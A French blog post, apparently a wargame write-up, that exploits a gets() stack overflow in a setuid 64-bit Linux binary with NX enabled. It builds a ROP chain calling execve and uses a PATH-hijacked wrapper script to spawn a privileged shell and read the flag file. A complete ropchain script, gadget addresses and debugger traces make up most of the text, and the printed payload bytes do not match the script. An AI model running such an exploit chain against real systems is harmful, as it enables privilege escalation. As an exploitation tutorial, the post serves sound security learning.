+++
authors = [ "poz" ]
date = "2016-10-03T10:48:10+02:00"
description = ""
draft = false
tags = [ "analysis", "assembly", "C", "code", "exploit", "fun", "linux", "security" ]
title = "Exploiter un binaire 64 bits sous Linux via ROP"
topics = []
+++

## Introduction


Bon ben dans la même veine que le post précedent, je vais tâcher d'expliquer comment exploiter un buffer overflow sur la stack, en utilisant la méthode de Return-Oriented Programming.  Cette technique est utilisée quand la stack n'est pas exécutable, l'idée étant de sauter dans une portion de code qui l'est, et petit à petit, reconstruire un flot d'exécution qui mène à... obtenir un shell avec des droits plus importants, dans le cas présent.  

	$ ll
	total 876
	drwxr-x---  2 user-cracked  user           4096 mai   25  2015 ./
	drwxr-xr-x 27 root          root           4096 sept. 26 20:01 ../
	-rwsr-x---  1 user-cracked  user         877214 mai   16  2015 prog*
	-rw-r-----  1 user-cracked  user            383 mai   24  2015 prog.c
	-r--------  1 user-cracked  user-cracked     23 juin   7  2015 .passwd
	$

Comme auparavant, on a un binaire setuid user-cracked, et il nous faut lire le fichier `.passwd`.  

Bon, essayons d'avoir quelques informations pertinentes...  

	$ checksec.sh --file ./prog
	RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
	Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   ./prog

	$ file prog
	prog: setuid ELF 64-bit LSB  executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=41592dcab5a8baf3af0ea207b149b6153ad1e6d1, not stripped

	$ cat prog.c
	#inclde <stdio.h>
	#include <string.h>

	/*
	gcc -o prog prog.c -fno-stack-protector  -Wl,-z,relro,-z,now,-z,noexecstack -static
	*/

	int main(int argc, char **argv)
	{

		char buffer[256];
		int len, i;

		gets(buffer);
		len = strlen(buffer);

		printf("Hex result: ");

		for (i=0; i<len; i++) {
			printf("%02x", buffer[i]);
		}

		printf("\n");
		return 0;
	}

Bon, il y a un buffer overflow évident à cause de `gets()`.  Tout le monde sait qu'il ne faut pas utiliser cette fonction, pas la peine d'épiloguer.  


Ici, il y a deux choses à avoir en tete:  

- la stack est non-exécutable

Ce qui fait qu'on ne pourra pas pousser un shellcode directement dans la stack, via un buffer à exploiter ou une variable d'environnement.  Il faudra faire du ret2libc, ou du ROP.  

- le programme tourne en 64 bits

Les conventions d'appel de fonction ne sont pas les mêmes qu'en 32 bits, les syscalls ont de petites différences, etc.  On verra ca dans la suite...  Il faut également garder à l'esprit que l'espace des adresses valide n'est pas le même qu'en 32 bits.  En effet souvent on utilise la fameuse séquence `0x414141..`. pour marquer qu'on contrôle bien le pointer `$eip`.  En 32 bits, cette adresse est valide puisque l'espace adressable va de `0X0..0` à `0xbfffffff`.  Par contre en 64 bits, on va de `0x00...0` à `0x0000b7ffffffffff`.  Donc `0x4141...` va directement taper dans les adresses interdites.  Si on forge une adresse bidon, il faut mettre les deux premiers bytes (au moins) à zéro.  

Cherchons la présence de fonctions qui nous aideraient bien à avoir un shell...  

	$ nm -a ./prog | egrep '(system|exec)'
	0000000000468420 T _dl_make_stack_executable
	00000000006c11a8 D _dl_make_stack_executable_hook
	000000000048ce60 t execute_cfa_program
	000000000048e200 t execute_stack_op
	00000000004aa1c0 r system_dirs
	00000000004aa1a0 r system_dirs_len
	$
  
Oookay, rien d'intéressant...   Vraiment?  
  

## Tentative de ret2libc
  


Il y a peut-être moyen de rendre la stack exécutable grâce à `mprotect()` (`_dl_make_stack_executable` nous y a fait fortement penser), puis de sauter à l'adresse d'un shellcode qu'on aurait mis dans le buffer du programme, ou dans une variable d'environnement.  

	$ nm prog| grep mprotect
	0000000000434e10 W mprotect
	0000000000434e10 T __mprotect
	$
  
Ca semble jouable? Le man de `mprotect(2)` nous dit qu'il faut PROT_EXEC pour rendre une portion de code exécutable (`0x4` d'après les headers du système).  Dans le doute, si on peut faire appel à cette fonction, autant filer tous les flags de l'univers: `PROT_EXEC|PROT_WRITE|PROT_READ` = `0x7`.  Le prototype de la fonction est le suivant :  
  
       int mprotect(void *addr, size_t len, int prot);
  
Il faudra donc mettre dans l'ordre, sur la stack:  
  
	adresses basses [ @__mprotect | return addr | 0x7 | stacksize | $esp ] adresses hautes
  
Euh... en fait non.  Deux choses:

- Pour une fonction qui n'est pas un `syscall`, sur x86-32 les paramètres sont passés sur la stack.  Alors que sur x86-64 on passe par les registres, donc la stack sera de la forme:

       	adresses basses [ @__mprotect | return addr ] adresses hautes

- Pour un `syscall` dans le deux cas on passe par les registres... mais ce ne sont pas les mêmes.  Sur x86-64 les paramètres sont passés par les registres `$rdi`, `$rsi`, `$rdx`, `$rcx`, `$r8`, et `$r9`.  Si vraiment il faut encore passer plus de paramètres à la fonction, alors c'est mis sur la stack (mais ça reste rare).  Mais on ne devrait pas aller jusque là, puisque `mprotect()` ne prend que 3 arguments.  
  
Une fois la stack rendue exécutable, il suffira d'avoir empilé l'adresse de notre shellcode (`return addr` dans le petit schéma) pour sauter où on souhaite.  
  

	gdb$ ./prog
	[...]
	gdb$ disas main
	Dump of assembler code for function main:
	   0x000000000040105e <+0>:     push   rbp
	   0x000000000040105f <+1>:     mov    rbp,rsp
	   0x0000000000401062 <+4>:     sub    rsp,0x120
	   [...]
  
On voit que le système réserve `0x120` (288) bytes dans la stack pour faire de la place aux variables locales, etc.  
  
	   0x0000000000401076 <+24>:    lea    rax,[rbp-0x110]
	   0x000000000040107d <+31>:    mov    rdi,rax
	   0x0000000000401080 <+34>:    call   0x408750 <gets>
  
A l'aide de ces trois instructions, on déduit que le registre `$rax` contient l'adresse du buffer qui sera passé à la fonction `gets()`.  Et que sa base est à `0x110` (272) bytes du début de la stack (`$rbp`).  On en déduit donc que si on écrit 272 bytes dans `buffer`, alors on arrivera stack a la limite de `$rbp` qui a été empilé.  Les 8 prochains bytes vont écraser $rbp, et les 8 suivant écraseront `$rip`.  C'est ce registre qu'on veut contrôler.  On va tester (par acquis de conscience on met une adresse valide dans `$rbp`, i.e. `0x0000424242424242`, et `0x0000434343434343` dans `$rip`):  
  
	gdb$ r < <(perl -e 'print "A"x272 . "B"x6 . "\x00\x00" . "C"x6 . "\x00\x00"')
	----------------------------------------------------------------------------------------------------------------------[regs]
	 RAX: 0x0000000000000000  RBX: 0x00000000004002B0  RBP: 0x0000424242424242  RSP: 0x000003D42322B720  o d I t s Z a P c
	 RDI: 0x0000000000000001  RSI: 0x00000000006C26C0  RDX: 0x000000000000000A  RCX: 0x0000000000434310  RIP: 0x0000434343434343
	 R8 : 0x000000000000000A  R9 : 0x0000000002296740  R10: 0x0000000000000022  R11: 0x0000000000000246  R12: 0x0000000000000000
	 R13: 0x0000000000401760  R14: 0x00000000004017F0  R15: 0x0000000000000000
	 CS: 0033  DS: 0000  ES: 0000  FS: 0063  GS: 0000  SS: 002B                            Error while running hook_stop:
	Cannot access memory at address 0x434343434343
	0x0000434343434343 in ?? ()
  
Youpi les knackis!  Donc on a réussi à écrire dans `$rip`. On met l'adresse de `mprotect()` dans `$rip`, on met un breakpoint sur l'instruction `ret`.  
  
	   [...]
	   0x00000000004010e6 <+136>:   mov    eax,0x0
	   0x00000000004010eb <+141>:   leave
	   0x00000000004010ec <+142>:   ret
	End of assembler dump.

	gdb$ b *0x00000000004010ec
	Breakpoint 1 at 0x4010ec

	gdb$ r < <(perl -e 'print "A"x272 . "B"x6 . "\x00\x00" . "\x10\x4e\x43"')
	[...]
	=> 0x4010ec <main+142>: ret
	[...]
	Breakpoint 1, 0x00000000004010ec in main ()
	gdb$ ni
	=> 0x434e10 <mprotect>: mov    eax,0xa
	   0x434e15 <mprotect+5>:       syscall
	   0x434e17 <mprotect+7>:       cmp    rax,0xfffffffffffff001
	   0x434e1d <mprotect+13>:      jae    0x438950 <__syscall_error>
	   0x434e23 <mprotect+19>:      ret
	   0x434e24:    nop    WORD PTR cs:[rax+rax*1+0x0]
	   0x434e2e:    xchg   ax,ax
	   0x434e30 <madvise>:  mov    eax,0x1c
	-----------------------------------------------------------------------------------------------------------------------------
	0x0000000000434e10 in mprotect ()

  
Bien!  Est-ce qu'on peut mettre les arguments voulus dans les registres idoines, maintenant?  Je ne vois pas comment faire, arrivé à ce stade.  C'est malin, j'aurais dû y penser plus tôt.  Ca a l'air compromis, de ne faire que du ret2libc.  Va falloir passer par du ROP.  
  

## Bon... ben ROP.
  

L'objectif est de trouver des séquences d'instructions dans la zone exécutable de la mémoire du processus, afin de les emboîter petit à petit pour arriver à une succession d'opérations qui feront quelque chose de particulier.  En l'occurrence, obtenir un shell avec les droits privilégiés.  
  
Récuperons un outil pour trouver des gadgets (c'est ainsi qu'on appelle ces séquences d'instructions).  Comme on n'a pas les droits en écriture dans le répertoire `$HOME`, on va tout mettre en bordel dans `/tmp`.  
  
	$ mkdir /tmp/p
	$ export PATH=$PATH:/tmp/p
  
On va tenter de faire exécuter un `execve()` via des gadgets, du coup.  Ce qu'on souhaite, c'est faire executer `execve("/bin/sh", NULL, NULL);`.  Notons que d'après la documentation de l'ABI du système, `$rax` doit contenir le numéro du syscall (et le contenu sera écrasé lors du retour de fonction, si jamais il se produit... dans notre cas on s'en moque, puisqu'on veut spawner un shell).  Il faudra donc mettre les registres dans l'état suivant:  
  
	 RAX <- 0x3b (= 59, la valeur du syscall execve() sur 64bits)
	 RDI <- "/bin/sh" ou quelque chose du genre
	 RSI <- 0x00 (NULL)
	 RDX <- 0x00 (NULL)
  
Donc, le layout de la stack en sortie de `main()` devrait ressembler à quelque chose comme ceci:  

	[ AAA....AAAA | BBBBBB00 | @(pop rax; ret) | 0x3b | @(pop rdi; ret) | "/bin/sh" | @(pop rsi; ret) | 0x0  | @(pop rdx; ret) | 0x0 | @syscall ]
         ^                         ^
         |                         |
         buffer                    $rip écrasé par cette adresse

Une fois arrivé à la fin de la fonction `main()`, le système va donc exécuter les instructions dont l'adresse est stockée en `$rip`, à savoir `pop rax; ret`.  Quand cette suite d'instructions est en cours d'exécution, le haut de la stack devient alors le mot de 8 octets suivant (`0x0000003b`), et c'est ce mot qui est `pop`-é pour être mis dans `$rax`.  On exécutera alors le `pop rdi; ret`, qui prendra la valeur sur la stack à ce moment, à savoir l'adresse de la chaîne de caractères `"/bin/sh"` pour la stocker dans `$rdi`.  Et ainsi de suite.

On va utiliser un outil dédié (il y en a d'autres, comme `ROPgadget`), pour avoir les adresses des instructions intéressantes:

	$ wget https://github.com/downloads/0vercl0k/rp/rp-lin-x64 -O /tmp/p/
	$ chmod +x /tmp/p/rp-lin-x64
  
	$ rp-lin-x64 --file ./prog --unique -r 1 | grep "pop rax"
	[...]
	0x0044d2b4: pop rax ; ret  ;  (8 found)

	$ rp-lin-x64 --file ./prog --unique -r 1 | grep "pop rdi"
	[...]
	0x004016d3: pop rdi ; ret  ;  (163 found)

	$ rp-lin-x64 -f prog --unique  -r 1 | grep "pop rsi"
	[...]
	0x004017e7: pop rsi ; ret  ;  (51 found)

	$ rp-lin-x64 -f prog --unique  -r 1 | egrep "pop rdx"
	[...]
	0x00437205: pop rdx ; ret  ;  (2 found)
  
Et pour finir, on cherche l'appel à un syscall.  Notons encore une fois une difference entre x86 et x86-64: l'appel est `int 0x80` sur 32 bits, alors qu'on utilise `syscall` sur x86-64 (depend si on est sur intel ou amd)  

	$ rp-lin-x64 -f prog --unique -r 1 | grep syscall
	[...]
	0x00400488: syscall  ;  (95 found)
  
Bien, on a l'adresse a empile en dernier!  
  

Maintenant, si vous avez fait attention, vous avez remarqué qu'on a zappé quelque chose!  On doit resoudre le probleme de la chaîne de caractères censée être utilisée par execve().

	$ nm -a ./ch34 | grep "/bin/sh"
	$

On ne trouve pas "/bin/sh" dans le binaire.  On va utiliser un trick:  trouver une petite chaîne dispo en mémoire, qui ne corresponde pas a une commande déjà existante, puis créer un wrapper à `/bin/dash` qui portera le nom de cette chaîne.  Ce wrapper sera mis dans le répertoire `/tmp/p`, qui est dans le `PATH`.  
  
	$ readelf -x .rodata ./prog | less
	[...]
	  0x00493c00 42654000 00000000 68654000 00000000 Be@.....he@.....
	[...]
  
On trouve la séquence `42654000`, qui correspond à `"Be@"` en ASCII, terminée par un nul-byte.  Son adresse est `0x00493c00`, et on l'utilisera dans `$rdi`.  Ensuite, on crée un petit shell script dans `/tmp/p`:  
  
	$ cat > /tmp/p/Be@
	#!/bin/dash
  
	/bin/dash
	$ chmod +x /tmp/p/Be@
  
Ainsi, si `execve()` invoque la commande `Be@`, elle sera dans notre `PATH`, et nous donnera un shell.  Magique non?  Ca évite une fastitieuse reconstruction d'un path type `"/bin/sh"` via des gadgets.  
  

Boooon, que les choses sérieuses commencent!  On va construire notre ropchain maintenant, en prenant soin de respecter l'endianness:  
  
	$ cat > /tmp/p/ropchain.py
	#!/usr/bin/env python3

	import sys
	import struct

	def main(argv):
	   if len(argv) < 2:
		print("Usage: %s <padding length>", argv[0])
 		raise SystemExit(-1)

	    padding_len = int(argv[1])

	    gadgets = []
	    gadgets.append(struct.pack('<Q', 0x000000000044d2b4))  # pop rax; ret
	    gadgets.append(struct.pack('<Q', 0x000000000000003b))  # store 59 on the stack
	    gadgets.append(struct.pack('<Q', 0x00000000004016d3))  # pop rdi; ret
	    gadgets.append(struct.pack('<Q', 0x0000000000493c00))  # addr of "Be@" to put in rsi
	    gadgets.append(struct.pack('<Q', 0x00000000004017e7))  # pop rsi; ret
	    gadgets.append(struct.pack('<Q', 0x0000000000000000))  # NULL pointer for args
	    gadgets.append(struct.pack('<Q', 0x0000000000437205))  # pop rdx; ret
	    gadgets.append(struct.pack('<Q', 0x0000000000000000))  # NULL pointer for envs
	    gadgets.append(struct.pack('<Q', 0x0000000000400488))  # syscall

	    payload = b'A' * (padding_len - 8) + b'B' * 6 + b'\x00\x00' + b''.join(gadgets)
	    print(payload)

	if __name__ == "__main__":
	    main(sys.argv)
	^D

	$ sc=$(ropchain.py 280); export sc=${sc:2:-1}; echo $sc
        AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB\x00\x00\x9f\xbdA\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x000\xec@\x00\x00\x00\x00\x00\x00<I\x00\x00\x00\x00\x00\xe7\x17@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05rC\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa7\x81K\x00\x00\x00\x00\x00'\xe9J\x00\x00\x00\x00\x00
  
NOTE:  le `${sc:2:-1}` permet de se débarrasser du `b"` en début de chaîne et `"` en fin de chaîne.  Il y a sûrement moyen de faire ça intelligemment mais je suis une bille en python, et j'avais pas de temps à perdre là-dessus!  
  

	$ gdb ./prog
	[...]
	gdb$ disas main
	   [...]
	   0x00000000004010e6 <+136>:   mov    eax,0x0
	   0x00000000004010eb <+141>:   leave
	   0x00000000004010ec <+142>:   ret
	End of assembler dump.

	gdb$ b *0x00000000004010ec
	Breakpoint 1 at 0x4010ec

	gdb$ r < <(perl -e 'print "'$sc'"')
	Starting program: /home/usr/prog < <(perl -e 'print "'$sc'"')
	[...]
	=> 0x4010ec <main+142>: ret
	   0x4010ed:    nop    DWORD PTR [rax]
	[...]
	Breakpoint 1, 0x00000000004010ec in main ()
  
On regarde l'état de la stack, et on observe qu'on a correctement empilé les adresses de nos petits gadgets:  
  
	gdb$ x/20gx $rsp - 30
	0x3ac2bce0758:  0x4141414141414141      0x4141414141414141
	0x3ac2bce0768:  0x4141414141414141      0x4141414141414141
	0x3ac2bce0778:  0x0000011600000116      0x0000424242424242
	0x3ac2bce0788:  0x000000000044d2b4      0x000000000000003b
	0x3ac2bce0798:  0x00000000004016d3      0x0000000000493c00
	0x3ac2bce07a8:  0x00000000004017e7      0x0000000000000000
	0x3ac2bce07b8:  0x0000000000437205      0x0000000000000000
	0x3ac2bce07c8:  0x0000000000400488      0x0000000000401700
	0x3ac2bce07d8:  0x0000000000000000      0x38ae7d8e75b336fa
	0x3ac2bce07e8:  0x3ff62a925f9536fa      0x0000000000000000

	gdb$ x/i $rip
	=> 0x4010ec <main+142>: ret

	gdb$ x/i 0x000000000044d2b4
	   0x44d2b4 <__printf_fp+4676>: pop    rax

	gdb$ x/2i 0x000000000044d2b4
	   0x44d2b4 <__printf_fp+4676>: pop    rax
	   0x44d2b5 <__printf_fp+4677>: ret

	gdb$ x/2i 0x00000000004016d3
	   0x4016d3 <__libc_setup_tls+515>:     pop    rdi
	   0x4016d4 <__libc_setup_tls+516>:     ret

	gdb$ x/2i 0x00000000004017e7
	   0x4017e7 <__libc_csu_init+135>:      pop    rsi
	   0x4017e8 <__libc_csu_init+136>:      ret

	gdb$ x/2i 0x0000000000437205
	   0x437205 <__lll_lock_wait_private+37>:       pop    rdx
	   0x437206 <__lll_lock_wait_private+38>:       ret

	gdb$ x/i 0x0000000000400488
	   0x400488 <backtrace_and_maps+183>:   syscall

  
Vérifions que la chaîne est celle attendue:  
  
	gdb$ x/s 0x0000000000493c00
	0x493c00:       "Be@"
	gdb$ c
	Continuing.

	Program received signal SIGSEGV, Segmentation fault.

  
Bizarre, si j'execute instruction par instruction on voit que tout se passe comme espère, mais on n'a pas de shell, et le programme explose.  D'ailleurs pour confirmer, on peut utiliser `strace(1)`:  
  
	$ (perl -e 'print "'$sc'"') | strace ./prog
	execve("./prog", ["./prog"], [/* 19 vars */]) = 0
	uname({sys="Linux", node="host", ...}) = 0
	brk(0)                                  = 0x44cf490
	brk(0x44d0650)                          = 0x44d0650
	arch_prctl(ARCH_SET_FS, 0x44cfd40)      = 0
	readlink("/proc/self/exe", "/home/user/prog", 4096) = 32
	brk(0x44f1650)                          = 0x44f1650
	brk(0x44f2000)                          = 0x44f2000
	access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
	fstat(0, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0
	mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x3811996c000
	read(0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 4096) = 352
	read(0, "", 4096)                       = 0
	fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 6), ...}) = 0
	mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x3811996b000
	write(1, "Hex result: 41414141414141414141"..., 569Hex result: 414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141160100000c010000424242424242) = 569
	execve("Be@", [0], [/* 0 vars */])      = -1 ENOENT (No such file or directory)
	--- SIGSEGV {si_signo=SIGSEGV, si_code=SI_KERNEL, si_addr=0} ---
	+++ killed by SIGSEGV +++
	Segmentation fault
  
On remarque la ligne:  
  
	execve("Be@", [0], [/* 0 vars */])      = -1 ENOENT (No such file or directory)
  
On est content, on a la confirmation qu'`execve()` est appelé, et avec les bons arguments qui plus est!  Tout va bien sauf que... `"Be@"` n'est pas trouvé (`ENOENT`)!  En fait le programme regarde dans le `CWD`.  Il faut donc qu'on exécute notre programme depuis le répertoire contenant notre wrapper a `/bin/dash`:  
  
	$ cd /tmp/p && (perl -e 'print "'$sc'"') | strace ~/prog
	[...]
	rt_sigaction(SIGTERM, NULL, {SIG_DFL, [], 0}, 8) = 0
	rt_sigaction(SIGTERM, {SIG_DFL, ~[RTMIN RT_1], SA_RESTORER, 0x28c41d06cb0}, NULL, 8) = 0
	read(10, "#!/bin/dash\n\n/bin/dash\n", 8192) = 23
	clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x28c422a5a10) = 3704
	wait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 3704
	--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=3704, si_status=0, si_utime=0, si_stime=0} ---
	rt_sigreturn()                          = 3704
	read(10, "", 8192)                      = 0
	exit_group(0)                           = ?
	+++ exited with 0 +++
	$
  
Ok, notre programme rend la main immédiatement.  Il a dû prendre un `EOF` ou une séquence terminant le shell.  On va utiliser le trick du built-in `cat`, pour maintenir le stdin ouvert (et on ajoute un `\n` pour flusher les buffers):  
  
	$ (perl -e 'print "'$sc'" . "\n"'; cat) |  ~/prog
	Hex result: 414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141160100000c010000424242424242
	ls
	Be@  ropchain.py  rp-lin-x64
	cd /home/user
	ls -la
	total 876
	drwxr-x---  2 user-cracked user           4096 May 25  2015 .
	drwxr-xr-x 27 root         root           4096 Sep 26 20:01 ..
	-r--------  1 user-cracked user-cracked     23 Jun  7  2015 .passwd
	-rwsr-x---  1 user-cracked user         877214 May 16  2015 prog
	-rw-r-----  1 user-cracked user            383 May 24  2015 prog.c
	cat .passwd
	CeciEstMonFlagTagadaTsoinTsoin!
  
Et voilà!  Youpi!
  
